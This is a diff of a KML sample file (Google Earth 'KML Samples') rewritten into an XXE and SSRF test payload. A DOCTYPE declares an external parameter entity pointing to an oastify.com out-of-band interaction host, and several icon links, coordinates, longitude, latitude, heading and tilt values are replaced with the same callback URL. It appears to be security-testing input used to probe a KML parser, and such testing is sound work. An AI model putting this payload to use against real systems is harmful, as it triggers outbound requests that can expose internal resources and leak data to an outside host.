@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://jxktyfdxe5vnb3txxfiq930mxd34ryfn.oastify.com"> %xxe; ]>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://5bh6m9nm7ayozq65lk0b3l8j2a81wxkm.oastify.com"> %xxe; ]>
 <kml xmlns="http://www.opengis.net/kml/2.2">
     <Document>
         <name>KML Samples</name>
@@ -9,14 +9,14 @@
         <Style id="downArrowIcon">
             <IconStyle>
                 <Icon>
-                    <href>http://4nseo03i4ql81ojin08bzoq7nytphq5f.oastify.com</href>
+                    <href>http://5bh6m9nm7ayozq65lk0b3l8j2a81wxkm.oastify.com</href>
                 </Icon>
             </IconStyle>
         </Style>
         <Style id="globeIcon">
             <IconStyle>
                 <Icon>
-                    <href>http://maps.google.com/mapfiles/kml/pal3/icon19.png</href>
+                    <href>http://5bh6m9nm7ayozq65lk0b3l8j2a81wxkm.oastify.com</href>
                 </Icon>
             </IconStyle>
             <LineStyle>
@@ -121,11 +121,11 @@
                 which you can mark your favorite places
             </description>
             <LookAt>
-                <longitude>-122.0839597145766</longitude>
-                <latitude>37.42222904525232</latitude>
+                <longitude>http://5bh6m9nm7ayozq65lk0b3l8j2a81wxkm.oastify.com</longitude>
+                <latitude>http://5bh6m9nm7ayozq65lk0b3l8j2a81wxkm.oastify.com</latitude>
                 <altitude>0</altitude>
-                <heading>-148.4122922628044</heading>
-                <tilt>40.5575073395506</tilt>
+                <heading>http://5bh6m9nm7ayozq65lk0b3l8j2a81wxkm.oastify.com</heading>
+                <tilt>http://5bh6m9nm7ayozq65lk0b3l8j2a81wxkm.oastify.com</tilt>
                 <range>500.6566641072245</range>
             </LookAt>
             <Placemark>
@@ -135,7 +135,7 @@
                     height of the underlying terrain.
                 </description>
                 <Point>
-                    <coordinates>-122.0822035425683,37.42228990140251,0</coordinates>
+                    <coordinates>http://5bh6m9nm7ayozq65lk0b3l8j2a81wxkm.oastify.com</coordinates>
                 </Point>
             </Placemark>
             <Placemark>
@@ -143,8 +143,8 @@
                 <visibility>1</visibility>
                 <description>Floats a defined distance above the ground.</description>
                 <LookAt>
-                    <longitude>-122.0839597145766</longitude>
-                    <latitude>37.42222904525232</latitude>
+                    <longitude>http://5bh6m9nm7ayozq65lk0b3l8j2a81wxkm.oastify.com</longitude>
+                    <latitude>http://5bh6m9nm7ayozq65lk0b3l8j2a81wxkm.oastify.com</latitude>
                     <altitude>0</altitude>
                     <heading>-148.4122922628044</heading>
                     <tilt>40.5575073395506</tilt>
